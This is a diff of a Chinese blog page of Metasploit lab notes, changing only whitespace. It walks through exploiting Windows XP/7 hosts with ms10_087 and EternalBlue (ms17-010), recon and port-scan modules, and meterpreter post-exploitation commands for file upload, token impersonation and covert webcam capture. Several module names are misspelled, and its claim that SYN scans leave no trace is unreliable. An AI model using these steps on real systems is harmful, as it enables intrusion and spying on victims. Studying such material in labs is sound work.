@@ -352,7 +352,7 @@ congratulation
 <li>接下来就可以拿shell了，控制目标计算机  </li>
 <li>sessions：查看返回来的会话，如果有多个电脑被攻击，就返回多个电脑的信息  </li>
 <li>sessions -i 1：查看受控制的第一个电脑  </li>
-<li>shell：拿到权限，进入到xp系统主机目录，可以进行操作<h3 id="MSF渗透测试三"><a href="#MSF渗透测试三" class="headerlink" title="MSF渗透测试三"></a>MSF渗透测试三</h3>使用word文件进行渗透 漏洞名称ms10_087  </li>
+<li>shell：拿到权限，进入到xp系统主机目录，可以进行操作<h3 id="MSF渗透测试三"><a href="#MSF渗透测试三" class="headerlink" title="MSF渗透测试三"></a>MSF渗透测试三</h3>使用word文件进行渗透 漏洞名称ms10_087      </li>
 <li>同上  </li>
 <li>search ms10-087</li>
 <li>同上  </li>
@@ -365,7 +365,7 @@ congratulation
 <li>run：开始生成一个文件  </li>
 <li>找到文件存放路径，将该文件放到win7以上的系统上面进行使用即可</li>
 </ol>
-<h3 id="渗透测试四"><a href="#渗透测试四" class="headerlink" title="渗透测试四"></a>渗透测试四</h3><p>永恒之蓝 ms17-010  即勒索病毒</p>
+<h3 id="渗透测试四"><a href="#渗透测试四" class="headerlink" title="渗透测试四"></a>渗透测试四</h3><p>永恒之蓝 ms17-010  即勒索病毒  </p>
 <ol>
 <li><p>同上  </p>
 </li>
@@ -373,7 +373,7 @@ congratulation
 </li>
 <li><p>use exploitwindows/smb/ms17-010-eternalblue  </p>
 </li>
-<li><p>show options  </p>
+<li><p>show options      </p>
 </li>
 <li><p>set RHOST win7主机,set LHOST kali主机ip ：配置RHOST 和LHOST     </p>
 </li>
@@ -497,11 +497,11 @@ congratulation
 </ol>
 <h3 id="flash-0day病毒"><a href="#flash-0day病毒" class="headerlink" title="flash 0day病毒"></a>flash 0day病毒</h3><p>不好用</p>
 <h3 id="MSF辅助模块"><a href="#MSF辅助模块" class="headerlink" title="MSF辅助模块"></a>MSF辅助模块</h3><ol>
-<li><p>Auxiliary模块，情报搜集阶段<br> 可以使用 whois 来进行信息搜集（linux自带whois）例如 whois baidu.com<font color = red>这里不要添加www.</font> 进行域名详细信息查询<br> ip地址详细信息查询，whois 114.114.114.114<br> 利用辅助模块查找邮箱 use auxiliary/gather/search_email_collector,设置domain也就是域名，<a href="http://www.baidu.com,将Google关掉" target="_blank" rel="noopener">www.baidu.com,将Google关掉</a> set search_google false ,run即可，因为百度中没有存在邮箱，所以搜索为0<br> 或者使用枚举 use auxiliary/gather/enum_dns<br> set domin baidu.com <font color = red>注意这里域名不要加www.因为枚举模块会自动添加</font>，run即可  </p>
+<li><p>Auxiliary模块，情报搜集阶段<br>可以使用 whois 来进行信息搜集（linux自带whois）例如 whois baidu.com<font color = red>这里不要添加www.</font> 进行域名详细信息查询<br>ip地址详细信息查询，whois 114.114.114.114<br>利用辅助模块查找邮箱 use auxiliary/gather/search_email_collector,设置domain也就是域名，<a href="http://www.baidu.com,将Google关掉" target="_blank" rel="noopener">www.baidu.com,将Google关掉</a> set search_google false ,run即可，因为百度中没有存在邮箱，所以搜索为0<br>或者使用枚举 use auxiliary/gather/enum_dns<br>set domin baidu.com <font color = red>注意这里域名不要加www.因为枚举模块会自动添加</font>，run即可  </p>
 </li>
-<li><p>端口扫描模块<br> （1）nmap：namp -sV 192.168….<br> （2）syn扫描：扫描器向目标主机端口发送请求链接的syn包，扫描器收到syn/ack后，不是发送ack应答，而是发送rst包请求断开，这样没有完成三次握手，无法建立连接，因此这种扫描不会被记录到系统日志中，及不会留下痕迹，但是这种扫描需要root权限。<br> 使用：use auxiliary/scanner/portscan/syno<br> options -&gt;set RHOSTS ——》set threads(设置线程为100) 100-》run<br> （3）TCP扫描：use auxiliary/scanner/portscan/tcp-&gt;set RHOSTS -&gt;set threads  </p>
+<li><p>端口扫描模块<br>（1）nmap：namp -sV 192.168….<br>（2）syn扫描：扫描器向目标主机端口发送请求链接的syn包，扫描器收到syn/ack后，不是发送ack应答，而是发送rst包请求断开，这样没有完成三次握手，无法建立连接，因此这种扫描不会被记录到系统日志中，及不会留下痕迹，但是这种扫描需要root权限。<br>使用：use auxiliary/scanner/portscan/syno<br>options -&gt;set RHOSTS ——》set threads(设置线程为100) 100-》run<br>（3）TCP扫描：use auxiliary/scanner/portscan/tcp-&gt;set RHOSTS -&gt;set threads  </p>
 </li>
-<li><p>服务版本信息检测<br>1（smb）<br>服务器消息块（Server Message Block，缩写为SMB），又称网络文件共享系统（Common Internet File System，缩写为CIFS, /ˈsɪfs/），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。它也提供经认证的行程间通信机能。<br> 使用:use auxiliary/scanner/smb/smb_version -&gt;set RHOSTS -&gt;run<br>2(SSH版本扫描)<br>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题<br>使用:use auxiliray/scanner/ssh/ssh_version ——&gt; set RHOSTS<br>3(FTP)版本扫描<br>文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。<br>使用：use auxiliary/scanner/ftp/ftp_verson -&gt;set RHOSTS -&gt;set threads-&gt;run  </p>
+<li><p>服务版本信息检测<br>1（smb）<br>服务器消息块（Server Message Block，缩写为SMB），又称网络文件共享系统（Common Internet File System，缩写为CIFS, /ˈsɪfs/），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。它也提供经认证的行程间通信机能。<br>使用:use auxiliary/scanner/smb/smb_version -&gt;set RHOSTS -&gt;run<br>2(SSH版本扫描)<br>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题<br>使用:use auxiliray/scanner/ssh/ssh_version ——&gt; set RHOSTS<br>3(FTP)版本扫描<br>文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。<br>使用：use auxiliary/scanner/ftp/ftp_verson -&gt;set RHOSTS -&gt;set threads-&gt;run  </p>
 <h3 id="拿到meterpreter-shell之后，后期攻击方法"><a href="#拿到meterpreter-shell之后，后期攻击方法" class="headerlink" title="拿到meterpreter shell之后，后期攻击方法"></a>拿到meterpreter shell之后，后期攻击方法</h3><ol>
 <li><p>上传文件到windows主机 命令upload <file> <destination>        </p>
 </li>
@@ -529,7 +529,7 @@ congratulation
 </li>
 <li><p>获取系统信息<br>sysinfo  </p>
 </li>
-<li><p>模拟任意用户（taken操作）<br>use incognito：假冒用户takens<br>例子 getuid   查看当前系统id<br> use incognito 伪装<br> list tokens -u 列出目标用户的可用令牌<br> impersonate_token”Machine\user”<br> getuid  </p>
+<li><p>模拟任意用户（taken操作）<br>use incognito：假冒用户takens<br>例子 getuid   查看当前系统id<br>use incognito 伪装<br>list tokens -u 列出目标用户的可用令牌<br>impersonate_token”Machine\user”<br>getuid  </p>
 </li>
 <li><p>webcam摄像头命令<br>webcam_list:查看摄像头<br>webcam__snap :通过摄像头拍照<br>webcam_stream:通过摄像头开启视频  </p>
 </li>
